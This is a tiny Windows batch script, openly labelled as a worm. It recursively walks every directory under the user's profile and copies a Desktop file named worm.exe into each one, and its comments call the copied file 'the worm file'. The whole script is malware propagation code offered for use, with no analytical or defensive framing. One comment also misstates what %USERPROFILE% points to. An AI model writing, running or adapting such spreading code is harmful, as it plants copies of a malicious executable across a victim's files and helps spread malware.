@echo off
for /r "%USERPROFILE%" %%i in (.) do @copy "%USERPROFILE%\Desktop\worm.exe" "%%i"

REM %USERPROFILE% = is short version of "C:\Users\username\Desktop" etc

REM %USERPROFILE%\Desktop\LOL = the folder to be wormed

REM %USERPROFILE%\Desktop\worm.exe = the worm file
